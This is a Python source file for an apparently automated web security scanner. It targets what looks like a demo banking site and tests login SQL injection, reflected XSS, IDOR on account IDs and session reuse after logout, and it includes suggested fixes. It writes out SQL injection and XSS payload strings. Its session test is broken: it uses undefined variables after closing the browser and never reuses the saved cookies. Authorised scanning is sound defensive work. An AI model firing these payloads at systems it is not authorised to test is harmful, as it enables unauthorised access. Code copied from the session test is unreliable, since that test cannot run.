import asyncio
import logging
from pathlib import Path

from browser.runner import PhantomBrowser
from agents.explorer import handle_login

logger = logging.getLogger("phantom")


class SecurityAgent:
    def __init__(self, base_url: str, pages: list, screenshots_dir: Path, headless: bool = True, login_steps: list = None):
        self.base_url = base_url
        self.pages = pages
        self.screenshots_dir = screenshots_dir
        self.headless = headless
        self.login_steps = login_steps

    async def run_tests(self, browser, events: list):
        all_security_bugs = []
        page = browser.page

        logger.info("  [Security] Testing SQL injection on login...")
        bugs = await self.test_sql_injection_login(page, browser)
        all_security_bugs.extend(bugs)

        logger.info("  [Security] Testing XSS in search...")
        bugs = await self.test_xss_search(page)
        all_security_bugs.extend(bugs)

        logger.info("  [Security] Testing IDOR on account pages...")
        bugs = await self.test_idor(page, browser)
        all_security_bugs.extend(bugs)

        logger.info("  [Security] Testing session after logout...")
        bugs = await self.test_session_persistence(browser)
        all_security_bugs.extend(bugs)

        return all_security_bugs

    async def _login(self, page, browser):
        if self.login_steps:
            await browser.execute_login(self.login_steps)
        else:
            await handle_login(page, self.base_url)

    async def test_sql_injection_login(self, page, browser):
        bugs = []
        login_url = f"{self.base_url}/login.jsp"

        sql_payloads = [
            ("admin'--", "anything"),
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin'/*", "anything"),
            ("') OR ('1'='1", "anything"),
        ]

        for username, password in sql_payloads:
            try:
                await page.goto(login_url)
                await page.wait_for_timeout(500)

                await page.fill("#uid", username)
                await page.fill("#passw", password)
                await page.click("[type=submit]")
                await page.wait_for_timeout(2000)

                current_url = page.url
                content = await page.content()

                auth_indicators = [
                    "main.jsp", "bank/", "myaccount",
                    "welcome", "logout", "signoff"
                ]

                if any(ind in current_url.lower() for ind in auth_indicators):
                    bugs.append({
                        "title": "SQL Injection bypasses login authentication",
                        "severity": "critical",
                        "type": "sql_injection_auth_bypass",
                        "category": "security",
                        "evidence": {
                            "confirmed": True,
                            "payload": username,
                            "result": f"Reached {current_url} without valid password"
                        },
                        "actual_behavior": f"Login bypassed using payload '{username}'. Reached {current_url}",
                        "expected_behavior": "Login should reject invalid credentials",
                        "steps_to_reproduce": [
                            f"Navigate to {login_url}",
                            f"Enter username: {username}",
                            "Enter any password",
                            "Click login",
                            "Observe: authenticated without valid credentials"
                        ],
                        "affected_url": login_url,
                        "suggested_fix": "Use PreparedStatements or parameterized queries for user authentication logic to prevent direct SQL evaluation."
                    })
                    break
            except Exception as e:
                logger.debug(f"SQL Injection test error: {e}")
                continue

        return bugs

    async def test_xss_search(self, page):
        bugs = []

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "';alert(1)//",
            "<svg onload=alert(1)>",
        ]

        search_urls = [
            f"{self.base_url}/search.jsp",
            f"{self.base_url}/query",
        ]

        for search_url in search_urls:
            for payload in xss_payloads:
                try:
                    await page.goto(f"{search_url}?query={payload}", timeout=8000)
                    content = await page.content()

                    if "<script>" in content or "onerror=" in content or "<svg" in content:
                        bugs.append({
                            "title": "Reflected XSS in search parameter",
                            "severity": "high",
                            "type": "reflected_xss",
                            "category": "security",
                            "evidence": {
                                "confirmed": True,
                                "payload": payload,
                                "result": "Payload reflected unescaped in response"
                            },
                            "actual_behavior": f"XSS payload '{payload[:50]}' reflected unescaped in page response",
                            "expected_behavior": "Search input should be HTML-encoded before rendering",
                            "steps_to_reproduce": [
                                f"Navigate to {search_url}",
                                f"Submit search query: {payload}",
                                "Observe: script tag appears unescaped in HTML response"
                            ],
                            "affected_url": search_url,
                            "suggested_fix": "Apply context-aware HTML encoding to all user-submitted search inputs before reflecting them back in the DOM."
                        })
                        break
                except Exception as e:
                    logger.debug(f"XSS test error: {e}")
                    continue

        return bugs

    async def test_idor(self, page, browser):
        bugs = []

        # Login first
        await self._login(page, browser)

        # Go to main page to settle session correctly
        try:
            await page.goto(f"{self.base_url}/bank/main.jsp")
            await page.wait_for_timeout(500)
        except Exception:
            pass

        test_account_ids = [
            "800000", "800001", "800002",
            "1", "2", "100", "123456"
        ]

        for acct_id in test_account_ids:
            try:
                target_url = f"{self.base_url}/bank/showAccount?acctId={acct_id}"
                await page.goto(target_url, timeout=8000)
                content = await page.content()

                if any(indicator in content.lower() for indicator in ["account number", "balance", "transaction"]):
                    if "error" not in content.lower() and "unauthorized" not in content.lower():
                        bugs.append({
                            "title": "IDOR: Can access other users account data by changing ID in URL",
                            "severity": "high",
                            "type": "idor",
                            "category": "security",
                            "evidence": {
                                "confirmed": True,
                                "url": target_url,
                                "result": f"Account {acct_id} data visible without ownership verification"
                            },
                            "actual_behavior": f"Accessing /showAccount?acctId={acct_id} reveals account data without verifying ownership",
                            "expected_behavior": "Should return 403 or redirect if account doesn't belong to logged-in user",
                            "steps_to_reproduce": [
                                "Login to application",
                                f"Navigate to {target_url}",
                                "Observe: account data visible without authorization check"
                            ],
                            "affected_url": target_url,
                            "suggested_fix": "Implement robust access controls verifying that the currently logged-in user owns the account ID requested in the URL. Reject unauthorized cross-account access."
                        })
                        break
            except Exception as e:
                logger.debug(f"IDOR test error: {e}")
                continue

        return bugs

    async def test_session_persistence(self, browser):
        bugs = []

        # Create new dedicated context for this test
        context = await browser._playwright.chromium.launch()
        browser_context = await context.new_context()
        page = await browser_context.new_page()

        # Login
        await self._login(page, browser)
        await page.wait_for_timeout(1000)

        cookies = await browser_context.cookies()
        session_cookies = [c for c in cookies if "jsession" in c["name"].lower() or "session" in c["name"].lower() or "auth" in c["name"].lower()]

        if not session_cookies:
            await browser_context.close()
            await context.close()
            return bugs

        logout_urls = [
            f"{self.base_url}/logout.jsp",
            f"{self.base_url}/bank/logout.jsp",
            f"{self.base_url}/signoff.jsp"
        ]
        
        for logout_url in logout_urls:
            try:
                await page.goto(logout_url, timeout=5000)
                break
            except:
                continue

        await page.wait_for_timeout(1000)
        await browser_context.close()
        await context.close()

        # Step 4: Re-use cookies
        new_page = await new_context.new_page()
        # Ensure our browser wrapper can still work with this page if needed
        # but for session persistence we stay low-level

        try:
            target_url = f"{self.base_url}/bank/main.jsp"
            await new_page.goto(target_url, timeout=8000)
            content = await new_page.content()
            current_url = new_page.url

            if "main.jsp" in current_url or ("account" in content.lower() and "login" not in current_url):
                bugs.append({
                    "title": "Session token remains valid after logout",
                    "severity": "high",
                    "type": "session_persistence_after_logout",
                    "category": "security",
                    "evidence": {
                        "confirmed": True,
                        "result": "Old session cookie still grants access after logout"
                    },
                    "actual_behavior": "Session cookie remains valid safely after user logs out. Attacker can reuse stolen session.",
                    "expected_behavior": "Server should invalidate session token instantly on the backend upon logout",
                    "steps_to_reproduce": [
                        "Login to application",
                        "Copy JSESSIONID cookie value",
                        "Click logout",
                        "Make new request with old JSESSIONID",
                        "Observe: still authenticated"
                    ],
                    "affected_url": target_url,
                    "suggested_fix": "Call session.invalidate() on the Java/JSP backend exclusively upon logout. Do not merely discard cookies on client-side."
                })
        except Exception as e:
            logger.debug(f"Session persistence error: {e}")

        await new_context.close()
        await new_context_obj.close()
        return bugs
